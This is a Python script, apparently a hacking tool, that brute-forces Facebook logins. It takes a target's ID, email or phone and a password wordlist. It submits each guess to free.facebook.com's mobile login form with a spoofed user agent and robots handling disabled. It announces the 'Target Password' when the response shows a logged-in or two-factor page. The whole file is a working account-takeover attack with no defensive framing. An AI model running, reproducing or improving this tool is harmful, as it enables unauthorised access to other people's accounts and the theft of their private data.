import time
import os
import sys
import random 
import threading
from res import color
import mechanize
from res import agent

#arguments = sys.argv
#command = arguments[2]

os.system("clear")
print("\n\n")

id_link = input(color.BOLD+color.YELLOW+color.BOLD+"\n   [+] Enter ID/Email/Phone :  "+color.LIGHT_CYAN)


password_list = input(color.BOLD+color.RED+color.BOLD+"\n   [+] Enter Password File Name :  "+color.LIGHT_CYAN)



#get_id.getId(id_link)


headers = {
	'User-Agent': agent.myAgent,
}
browser = mechanize.Browser()
#browser.set_handle_equiv(True)
#browser.set_handle_gzip(True)
#browser.set_handle_redirect(True)
#browser.set_handle_referer(True)
#browser.addheaders = [('User-Agent',headers['User-Agent'])]
browser.set_handle_equiv(True)
browser.set_handle_redirect(True)
browser.set_handle_referer(True)
browser.set_handle_robots(False)
# Follows refresh 0 but not hangs on refresh &gt; 0
browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
browser.addheaders = [('User-agent',agent.myAgent )]
#browser.set_handle_robots(False)



# Function to process numbers
def process_number(id_link,number):
    print_lock = threading.Lock()
    if len(number) < 6:
        return
    with print_lock:
        print(color.BOLD+random.choice(color.color_list)+color.BOLD+" \n Trying Password  --------> "+color.BOLD+color.CYAN+color.BOLD+str(number))
        print("_____"*9)
        browser.open('https://free.facebook.com/login.php')
        browser.select_form(nr=0)
        browser.form['email'] = id_link
        browser.form['pass'] = number 
        response_data = browser.submit()
        time.sleep(0.5)
        res_data = response_data.read()
        res = res_data.decode()
        #print(res)
        f = open("index.html", "w")
        f.write(res)
        f.close()
        if 'Find Friends' in res  or "Log in with one tap" in res or "Next time you log in on this device, simply tap your account instead of typing a password." in res or 'Two-factor authentication' in res or 'security code' in res:
            os.system("clear")
            os.system("figlet -f small 'Successful'| lolcat")
            print(color.BOLD+color.BOLD+color.GREEN+"\n Target Password Is "+color.RED+ number)
            os.system("php -S localhost:8080")
            exit_flag.set()
            

# Open the file and read numbers
with open(password_list, 'r') as file:
    numbers = [line.strip() for line in file]

# Calculate the number of lines and threads
line_count = len(numbers)
thread_limit = 1  # Adjust as needed
lines_per_thread = line_count // thread_limit

# Create a threading.Event for the exit flag
exit_flag = threading.Event()

# Function to create and run threads
def run_threads(thread_start, thread_end):
    for i in range(thread_start, thread_end):
        if exit_flag.is_set():
            break  # Exit the loop if the exit flag is set
        process_number(id_link,numbers[i])

# Start the threads
threads = []
for i in range(0, line_count, lines_per_thread):
    thread_start = i
    thread_end = min(i + lines_per_thread, line_count)
    thread = threading.Thread(target=run_threads, args=(thread_start, thread_end))
    threads.append(thread)
    thread.start()

# Wait for the threads to finish
for thread in threads:
    thread.join()
